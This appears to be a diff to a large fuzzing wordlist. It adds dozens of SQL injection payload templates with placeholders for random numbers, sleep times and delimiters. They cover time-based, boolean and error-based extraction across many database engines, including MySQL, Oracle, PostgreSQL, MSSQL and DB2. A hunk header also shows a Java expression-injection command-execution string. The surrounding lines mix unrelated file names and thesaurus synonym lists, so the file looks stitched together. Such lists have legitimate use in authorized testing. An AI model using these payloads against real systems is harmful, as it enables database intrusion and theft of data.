@@ -7237,10 +7237,55 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 (0001565306712081)forgotpasswordemailupdate.xml
 (0001643063868066)abstractclassificationupdate.xml
 (SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
+([randnum]=[randnum] and sleep([sleeptime]))
+(case when ([randnum]=[randnum]) then (select benchmark([sleeptime]000000,md5('[randstr]'))) else [randnum])
+(case when ([randnum]=[randnum]) then [origvalue] else [randnum]*(select [randnum] from dual union select [randnum1] from dual) end)
+(case when ([randnum]=[randnum]) then [randnum] else [randnum]*(select [randnum] from dual union select [randnum1] from dual) end)
+(case when ([randnum]=[randnum]) then sleep([sleeptime]) else [randnum] end)
+(cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric))
+(cast('[delimiter_start]'||(select 1 from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1)::text||'[delimiter_stop]' as numeric))
+(convert(int,(select '[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]')))
+(extractvalue([randnum],concat('\','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]')))
+(select '[delimiter_start]'+(case when ([randnum]=[randnum]) then '1' else '0' end)+'[delimiter_stop]')
+(select '[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]')
+(select '[delimiter_start]'||(case when ([randnum]=[randnum]) then to_number(1) else to_number(0) end)||'[delimiter_stop]' from dual)
+(select '[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]')
+(select (case when ([randnum]=[randnum]) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else [randnum] end) from dual)
+(select (case when ([randnum]=[randnum]) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else [randnum] end))
+(select (case when ([randnum]=[randnum]) then [origvalue] else (select [randnum1] union select [randnum2]) end))
+(select (case when ([randnum]=[randnum]) then [origvalue] else 1/(select 0) end))
+(select (case when ([randnum]=[randnum]) then [origvalue] else [randnum] end) from sysmaster:sysdual)
+(select (case when ([randnum]=[randnum]) then [origvalue] else [randnum]*(select [randnum] union all select [randnum1]) end))
+(select (case when ([randnum]=[randnum]) then [origvalue] else cast(1 as int)/(select 0 from dual) end) from dual)
+(select (case when ([randnum]=[randnum]) then [randnum] else 1/(select 0) end))
+(select (case when ([randnum]=[randnum]) then [randnum] else 1/0 end) from sysmaster:sysdual)
+(select (case when ([randnum]=[randnum]) then [randnum] else [randnum]*(select [randnum] union all select [randnum1]) end))
+(select (case when ([randnum]=[randnum]) then [randnum] else cast(1 as int)/(select 0 from dual) end) from dual)
+(select (case when ([randnum]=[randnum]) then dbms_pipe.receive_message('[randstr]',[sleeptime]) else [randnum] end) from dual)
+(select (case when ([randnum]=[randnum]) then regexp_substring(repeat(left(crypt_key('aes',null),0),[sleeptime]00000000),null) else '[randstr]' end) from (values(0)))
+(select (case when ([randnum]=[randnum]) then regexp_substring(repeat(right(char([randnum]),0),[sleeptime]00000000),null) else '[randstr]' end) from information_schema.system_users)
 (select * from (select(sleep(5)))ecmj)
 (select * from (select(sleep(5)))ecmj)#
 (select * from (select(sleep(5)))ecmj)--
+(select * from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1)
+(select 2*(if((select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))s), 8446744073709551610, 8446744073709551610)))
+(select [origvalue] from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1)
+(select [randnum] from (select(sleep([sleeptime])))[randstr])
+(select [randnum] from pg_sleep([sleeptime]))
+(select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
+(select [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then 1 else 0 end from rdb$database)||'[delimiter_stop]'))
+(select concat('[delimiter_start]',(elt([randnum]=[randnum],1)),'[delimiter_stop]'))
+(select concat(concat('[delimiter_start]',(case when ([randnum]=[randnum]) then '1' else '0' end)),'[delimiter_stop]'))
+(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+(select count(*) from generate_series(1,[sleeptime]000000))
+(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
+(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
+(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+(select count(*) from sysmaster:syspaghdr)
+(select like('abcdefg',upper(hex(randomblob([sleeptime]00000000/2)))))
 (select top 1
+(select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual)
+(updatexml([randnum],concat('.','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum1]))
 ) and 0=benchmark(3000000,md5(1)) #
 ) and 0=benchmark(3000000,md5(1)) --
 ) and 0=benchmark(3000000,md5(1)) /*
@@ -7431,13 +7476,46 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 +if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null,null,null)%20%23
 +if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null,null,null)%20--
 +if(benchmark(3000000,md5(1)),null,null),null,null,null,null,null,null,null,null,null)%20/*
+,(begin if ([randnum]=[randnum]) then dbms_lock.sleep([sleeptime]); else dbms_lock.sleep(0); end if; end;)
+,(cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric))
+,(cast('[delimiter_start]'||(select 1 from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1)::text||'[delimiter_stop]' as numeric))
+,(select (case when ([randnum]=[randnum]) then (ascii(regexp_substring(repeat(left(crypt_key('aes',null),0),[sleeptime]00000000),null))) else [randnum]/(select 0 from (values(0))) end) from (values(0)))
+,(select (case when ([randnum]=[randnum]) then (ascii(regexp_substring(repeat(right(char([randnum]),0),[sleeptime]00000000),null))) else [randnum]/(select 0 from information_schema.system_users) end) from information_schema.system_users)
+,(select (case when ([randnum]=[randnum]) then (select [randnum] from pg_sleep([sleeptime])) else 1/(select 0) end))
+,(select (case when ([randnum]=[randnum]) then (select benchmark([sleeptime]000000,md5('[randstr]'))) else [randnum]*(select [randnum] from mysql.db) end))
+,(select (case when ([randnum]=[randnum]) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)
+,(select (case when ([randnum]=[randnum]) then (select count(*) from generate_series(1,[sleeptime]000000)) else 1/(select 0) end))
+,(select (case when ([randnum]=[randnum]) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else [randnum]*(select [randnum] union all select [randnum1]) end))
+,(select (case when ([randnum]=[randnum]) then 1 else 1/(select 0) end))
+,(select (case when ([randnum]=[randnum]) then 1 else [randnum]*(select [randnum] from information_schema.plugins) end))
+,(select (case when ([randnum]=[randnum]) then 1 else [randnum]*(select [randnum] union all select [randnum1]) end))
+,(select (case when ([randnum]=[randnum]) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)
+,(select (case when ([randnum]=[randnum]) then [origvalue] else 1/(select 0) end))
+,(select (case when ([randnum]=[randnum]) then [origvalue] else [randnum]*(select [randnum] from information_schema.plugins) end))
+,(select (case when ([randnum]=[randnum]) then [origvalue] else [randnum]*(select [randnum] union all select [randnum1]) end))
+,(select (case when ([randnum]=[randnum]) then [origvalue] else cast(1 as int)/(select 0 from dual) end) from dual)
+,(select (case when ([randnum]=[randnum]) then dbms_pipe.receive_message('[randstr]',[sleeptime]) else 1/(select 0 from dual) end) from dual)
+,(select (case when ([randnum]=[randnum]) then sleep([sleeptime]) else [randnum] end))
 ,(select * from (select(sleep(10)))a)
+,(select * from generate_series([randnum],[randnum],case when ([randnum]=[randnum]) then 1 else 0 end) limit 1)
+,(select [randnum] from (select 2*(if((select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))s), 8446744073709551610, 8446744073709551610)))x)
+,(select [randnum] from (select exp(~(select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))x)))s)
+,(select [randnum] from (select json_keys((select convert((select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]')) using utf8))))x)
+,(select [randnum] from (select row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x))s)
+,(select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
+,(select [randnum] where [randnum]=convert(int,(select '[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]')))
+,(select [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then 1 else 0 end from rdb$database)||'[delimiter_stop]'))
+,(select case when [randnum]=[randnum] then 1 else raise_error(70001, '[randstr]') end from sysibm.sysdummy1)
+,(select case when [randnum]=[randnum] then [origvalue] else raise_error(70001, '[randstr]') end from sysibm.sysdummy1)
 ,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))#
 ,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
 ,(select if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+,(select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual)
 ,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))%23
 ,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))--
 ,(select%20if(count(*)!=-1,benchmark(3000000,md5(1)),benchmark(3000000,md5(1))))/*
+,extractvalue([randnum],concat('\','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'))
+,gtid_subset(concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum])
 ,null) waitfor delay '0:0:__time__' --
 ,null) waitfor delay '0:0:__time__' /*
 ,null,null) waitfor delay '0:0:__time__' --
@@ -7453,6 +7531,8 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 ,null,null,null,null,null,null,null) waitfor delay '0:0:__time__' /*
 ,null,null,null,null,null,null,null,null) waitfor delay '0:0:__time__' --
 ,null,null,null,null,null,null,null,null) waitfor delay '0:0:__time__' /*
+,raise_error('70001','[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from sysibm.sysdummy1)||'[delimiter_stop]')
+,updatexml([randnum],concat('.','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum1])
 -           delete the most recently copied buffer of text.
 - update notes
 -- update.js.erb.old
@@ -61054,12 +61134,17 @@ analyze_ao_table_first_update.sql
 anatomiaairdrop
 anchor,baldt anchor,navy anchor,northill anchor,affix,anchorage,annex,attach,batten,batten down,belay,berth,billet at,bind,bivouac,bower,bridle,burrow,camp,cast anchor,catch,cement,chain,cinch,clamp,clinch,colonize,come to anchor,cramp,dinghy anchor,disembark,dock,domesticate,drag anchor,drogue,drop anchor,drop the hook,enchain,engraft,ensconce,entrammel,establish residence,fasten,fasten down,fetter,fix,floating anchor,fluke,glue,graft,grapnel,grapple,gyve,hamper,handcuff,hive,hobble,hog-tie,holdfast,hook,hopple,imbed,inhabit,kedge,kedge anchor,kedge off,keep house,knit,lash,lash and tie,lay anchor,leash,live at,locate,mainstay,make fast,make secure,make sure,manacle,moor,mooring,mooring buoy,moorings,move,mudhook,mushroom anchor,nest,park,peg down,people,perch,picket,pin,pin down,pinion,plant,populate,put in irons,put to,relocate,reside,restrain,rivet,roost,rope,screw anchor,screw up,sea anchor,secure,security,set,set to,set up housekeeping,set up shop,settle,settle down,shackle,shank,sheet anchor,sit down,slip,squat,stability,stabilizer,stand,starboard anchor,stay at,stock,straitjacket,strap,strike root,support,take residence at,take root,take up residence,tether,tie,tie down,tie up,tighten,trammel,trice up,trim
 anchor/libraries/update.php
+and (select (case when ([randnum]=[randnum]) then null else cast('[randstr]' as numeric) end)) is null
+and (select (case when ([randnum]=[randnum]) then null else ctxsys.drithsx.sn(1,[randnum]) end) from dual) is null
 and (select * from (select(sleep(5)))bakl) and 'vrxe'='vrxe
 and (select * from (select(sleep(5)))nqip)
 and (select * from (select(sleep(5)))nqip)#
 and (select * from (select(sleep(5)))nqip)--
 and (select * from (select(sleep(5)))yjoc) and '%'='
+and (select 2*(if((select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))s), 8446744073709551610, 8446744073709551610)))
 and (select 4523 from(select count(*),concat(0x716a7a6a71,(select (elt(4523=4523,1))),0x71706a6b71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)
+and (select [randnum] from (select(sleep([sleeptime])))[randstr])
+and (select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
 and (select count(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' ) < number_of_table
 and (select hex(substr(tbl_name,1,1)) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0) > hex('some_char')
 and (select length(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number
@@ -61141,13 +61226,46 @@ and 5650=convert(int,(union all selectchar(88)+char(88)+char(88)+char(88)+char(8
 and 5650=convert(int,(union all selectchar(88)+char(88)+char(88)+char(88)+char(88)+char(88)))
 and 5650=convert(int,(union all selectchar(88)+char(88)+char(88)+char(88)+char(88)+char(88)))#
 and 5650=convert(int,(union all selectchar(88)+char(88)+char(88)+char(88)+char(88)+char(88)))--
+and [randnum] in (select ('[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'))
+and [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then 1 else 0 end from rdb$database)||'[delimiter_stop]')
+and [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then code(49) else code(48) end)||'[delimiter_stop]')
+and [randnum]=(select (case when ([randnum]=[randnum]) then [randnum] else (select [randnum1] union select [randnum2]) end))
+and [randnum]=(select [randnum] from pg_sleep([sleeptime]))
+and [randnum]=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+and [randnum]=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+and [randnum]=(select count(*) from generate_series(1,[sleeptime]000000))
+and [randnum]=(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
+and [randnum]=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
+and [randnum]=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+and [randnum]=(select count(*) from sysmaster:syspaghdr)
+and [randnum]=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
+and [randnum]=(select count(fuzzbits('[randstr]', 0.001)) from numbers(1000000))
+and [randnum]=(select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual)
+and [randnum]=benchmark([sleeptime]000000,md5('[randstr]'))
+and [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric)
+and [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then bitcount(bitstring_to_binary('1')) else bitcount(bitstring_to_binary('0')) end))::varchar||'[delimiter_stop]' as numeric)
+and [randnum]=concat('[delimiter_start]',(select (case when ([randnum]=[randnum]) then '1' else '0' end)),'[delimiter_stop]')
+and [randnum]=convert(int,(select '[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'))
+and [randnum]=ctxsys.drithsx.sn([randnum],('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
+and [randnum]=dbms_utility.sqlid_to_sqlhash(('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
+and [randnum]=raise_error('70001','[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from sysibm.sysdummy1)||'[delimiter_stop]')
+and [randnum]=utl_inaddr.get_host_address('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]')
 and drop
+and elt([randnum]=[randnum],sleep([sleeptime]))
+and error(concat('[delimiter_start]',(select (case when ([randnum]=[randnum]) then '1' else '0' end)),'[delimiter_stop]')) is not null
+and exp(~(select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))x))
+and extractvalue([randnum],concat('\','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'))
+and gtid_subset(concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum])
+and json_keys((select convert((select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]')) using utf8)))
+and row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x)
 and sleep(120)
 and sleep(120) --
 and sleep(5)
 and sleep(5)#
 and sleep(5)--
+and sleep([sleeptime])
 and update it when i see something obvious in the logs. suggestions
+and updatexml([randnum],concat('.','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum1])
 and-delete
 and-drop
 and_01.2.update.sqlpp
@@ -68316,6 +68434,7 @@ beforeupdate.php
 beg off,abandon,back out,be unmoved,be unwilling,cry off,decline,decline to accept,depart from,disagree,disallow,discard,disclaim,dissent,drop out,evacuate,forsake,go back on,hold out against,jettison,jilt,leave,leave behind,leave flat,maroon,negate,negative,not buy,not consent,not hear of,not think of,pull out,quit,quit cold,refuse,refuse consent,reject,renege,repudiate,resist entreaty,resist persuasion,say goodbye to,say nay,say no,stand aloof,stand down,take leave of,throw over,turn down,vacate,vote nay,vote negatively,withdraw
 beg the question,about the bush,around the bush,beat about,beat around,bicker,boggle,cavil,choplogic,dodge,duck,equivocate,evade,evade the issue,fence,hedge,hem and haw,mystify,nitpick,obscure,palter,parry,pick nits,prevaricate,pull away,pull back,pussyfoot,put off,quibble,recoil,sheer off,shift,shift off,shrink,shuffle,shy,shy away,shy off,sidestep,split hairs,step aside,swerve,tergiversate,ward off
 beg to differ,agree to differ,agree to disagree,be at variance,be in dissent,differ,disagree,disagree with,discord with,dissent,dissent from,divide on,drop out,not agree,oppose,secede,take exception,take issue,withdraw,withhold assent
+begin if ([randnum]=[randnum]) then dbms_lock.sleep([sleeptime]); else dbms_lock.sleep(0); end if; end;
 beginupdate
 begrenzungsschalter
 behalter
@@ -91725,6 +91844,7 @@ elmah.io.umbraco.example/umbraco/actions/delete.aspx
 elmselect-com
 elrond-db-delete.sql
 elseselect.sql
+elt([randnum]=[randnum],sleep([sleeptime]))
 elternalter
 elunion
 elupdate
@@ -94001,6 +94121,7 @@ exon_reporter.drop.sql
 exon_reporter_gene.drop.sql
 exoticdelete
 exoticupdate
+exp(~(select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))x))
 exp-expired-incomplete-delete.xml
 exp-expired-incomplete-delete.xml.svn-base
 exp-expired-incomplete-with-properties-delete.xml
@@ -100216,6 +100337,7 @@ gte_01.2.update.sqlpp
 gtfsrtstoptimeupdate
 gtfsrttripupdate
 gti_form_usuarios_beforedelete.cfm
+gtid_subset(concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum])
 gtk-update-icon-cache
 gtk-update-icon-cache-1:4.0.3-1-x86_64.pkg.tar.zst
 gtk-update-icon-cache-1:4.2.0-2-x86_64.pkg.tar.zst
@@ -107432,6 +107554,7 @@ json-select
 json-update
 json_array_append_basic_select.sql
 json_array_insert.sql
+json_keys((select convert((select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]')) using utf8)))
 json_select.xml
 json_select_insert.sql
 json_union.sql
@@ -112078,6 +112201,7 @@ makalah-update
 makc_alter
 make_delete
 make_insert.sql
+make_set([randnum]=[randnum],sleep([sleeptime]))
 make_undelete
 make_update
 make_update.sql
@@ -121034,21 +121158,58 @@ optreviewaddexec.jsp
 opus,nachtmusik,absolute music,adaptation,air varie,aleatory,aleatory music,arrangement,article,artifact,autograph,best seller,book,bound book,brainchild,chamber music,chamber orchestra,child,classic,coinage,coloring book,composition,computer printout,concoction,copy,creation,creature,crowning achievement,definitive work,descant,distillation,document,draft,edited version,effect,electronic music,end product,engrossment,essay,essence,etude,exercise,extract,fair copy,fiction,final draft,finished version,first draft,flimsy,folio,fruit,great work,handiwork,hardback,harmonization,holograph,incidental music,instrumental music,invention,issue,juvenile,juvenile book,letter,limp-cover book,literae scriptae,literary artefact,literary production,literature,lucubration,magnum opus,manufacture,manuscript,masterpiece,masterwork,matter,mintage,new mintage,nocturne,nonbook,nonfiction,notebook,novel,oeuvre,offspring,opera,opuscule,opusculum,orchestration,original,origination,outcome,outgrowth,paper,paperback,parchment,penscript,picture book,piece,piece of writing,play,playbook,pocket book,poem,prayer book,printed matter,printout,product,production,program music,psalmbook,psalter,publication,reading matter,recension,result,ricercar,score,screed,scrip,script,scrive,scroll,second draft,serial,sketchbook,soft-cover,sonata,sonatina,songbook,standard work,storybook,string orchestra,string quartet,study,the written word,theme and variations,title,tome,trade book,transcript,transcription,trio,typescript,variation,version,volume,work,writing
 opusinsert
 opw-postgresql-ddl-drop.sql
+or (select (case when ([randnum]=[randnum]) then null else cast('[randstr]' as numeric) end)) is null
+or (select (case when ([randnum]=[randnum]) then null else ctxsys.drithsx.sn(1,[randnum]) end) from dual) is null
+or (select 2*(if((select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))s), 8446744073709551610, 8446744073709551610)))
+or (select [randnum] from (select(sleep([sleeptime])))[randstr])
+or (select [randnum] from(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from information_schema.plugins group by x)a)
 or (select*from(select(sleep(5)))a)#
+or 1 group by concat('[delimiter_start]',(select (case when ([randnum]=[randnum]) then 1 else 0 end)),'[delimiter_stop]',floor(rand(0)*2)) having min(0)
 or 1 in (select @@version)--
 or 1337=(select 1337 from (select sleep(120))a)
 or 1337=(select 1337 from (select sleep(120))a) --
 or 1337=(select 1337 from pg_sleep(120))
 or 1337=(select 1337 from pg_sleep(120)) --
+or [randnum] in (select ('[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'))
+or [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then 1 else 0 end from rdb$database)||'[delimiter_stop]')
+or [randnum]=('[delimiter_start]'||(select case [randnum] when [randnum] then code(49) else code(48) end)||'[delimiter_stop]')
+or [randnum]=(select (case when ([randnum]=[randnum]) then [randnum] else (select [randnum1] union select [randnum2]) end))
+or [randnum]=(select [randnum] from pg_sleep([sleeptime]))
+or [randnum]=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+or [randnum]=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)
+or [randnum]=(select count(*) from generate_series(1,[sleeptime]000000))
+or [randnum]=(select count(*) from information_schema.columns a, information_schema.columns b, information_schema.columns c where 0 xor 1)
+or [randnum]=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)
+or [randnum]=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)
+or [randnum]=(select count(*) from sysmaster:syspaghdr)
+or [randnum]=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)
+or [randnum]=(select count(fuzzbits('[randstr]', 0.001)) from numbers(1000000))
+or [randnum]=(select upper(xmltype(chr(60)||chr(58)||'[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'||chr(62))) from dual)
+or [randnum]=benchmark([sleeptime]000000,md5('[randstr]'))
+or [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end))::text||'[delimiter_stop]' as numeric)
+or [randnum]=cast('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then bitcount(bitstring_to_binary('1')) else bitcount(bitstring_to_binary('0')) end))::varchar||'[delimiter_stop]' as numeric)
+or [randnum]=concat('[delimiter_start]',(select (case when ([randnum]=[randnum]) then '1' else '0' end)),'[delimiter_stop]')
+or [randnum]=convert(int,(select '[delimiter_start]'+(select (case when ([randnum]=[randnum]) then '1' else '0' end))+'[delimiter_stop]'))
+or [randnum]=ctxsys.drithsx.sn([randnum],('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
+or [randnum]=dbms_utility.sqlid_to_sqlhash(('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]'))
+or [randnum]=raise_error('70001','[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from sysibm.sysdummy1)||'[delimiter_stop]')
+or [randnum]=utl_inaddr.get_host_address('[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from dual)||'[delimiter_stop]')
 or benchmark(10000000,md5(1))#
 or benchmark(50000000,md5(1))
 or benchmark(50000000,md5(1))#
 or benchmark(50000000,md5(1))--
+or elt([randnum]=[randnum],sleep([sleeptime]))
+or error(concat('[delimiter_start]',(select (case when ([randnum]=[randnum]) then '1' else '0' end)),'[delimiter_stop]')) is not null
+or exp(~(select * from (select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]','x'))x))
+or extractvalue([randnum],concat('\','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'))
+or gtid_subset(concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum])
+or json_keys((select convert((select concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]')) using utf8)))
 or pg_sleep(5)
 or pg_sleep(5)#
 or pg_sleep(5)--
 or pg_sleep(__time__)--
 or pg_sleep(__time__)--"
+or row([randnum],[randnum1])>(select count(*),concat('[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]',floor(rand(0)*2))x from (select [randnum2] union select [randnum3] union select [randnum4] union select [randnum5])a group by x)
 or sleep(120)
 or sleep(120) --
 or sleep(5)
@@ -121056,8 +121217,10 @@ or sleep(5)#
 or sleep(5)--
 or sleep(5)="
 or sleep(5)='
+or sleep([sleeptime])
 or sleep(__time__)#
 or sleep(__time__)='
+or updatexml([randnum],concat('.','[delimiter_start]',(select (elt([randnum]=[randnum],1))),'[delimiter_stop]'),[randnum1])
 or_drop.sql
 or_select.sf-1114540.sql
 ora-drop-all.sql
@@ -127124,6 +127287,8 @@ procaccominsert.sql
 procaccomupdate.sql
 procalendareventavailabilityblockdelete
 procalendarinstantbookslotdelete
+procedure analyse(extractvalue([randnum],concat('\','[delimiter_start]',(select (case when ([randnum]=[randnum]) then 1 else 0 end)),'[delimiter_stop]')),1)
+procedure analyse(extractvalue([randnum],concat('\',(benchmark([sleeptime]000000,md5('[randstr]'))))),1)
 procedure_drop.sql
 procedure_insert.sql
 procedureconditiondelete
@@ -130166,6 +130331,7 @@ raindropraindrop
 rainedrop
 rainfall,scotch mist,blood rain,bogginess,damp,dampness,dewiness,drizzle,evening mist,exudation,fall,flurry,fogginess,gout of rain,humectation,humor,marshiness,mist,mistiness,misty rain,mizzle,moistiness,moistness,moisture,patter,pitter-patter,precipitation,rain,raindrop,raininess,rainwater,sheet of rain,shower,showeriness,soddenness,sogginess,soppiness,splatter,sprinkle,swampiness,unfrozen hydrometeor,wateriness,wet,wetness,wettishness
 rais-drop-h2.sql
+raise_error('70001','[delimiter_start]'||(select (case when ([randnum]=[randnum]) then 1 else 0 end) from sysibm.sysdummy1)||'[delimiter_stop]')
 rajinupdate-info
 rajkotunion-coop
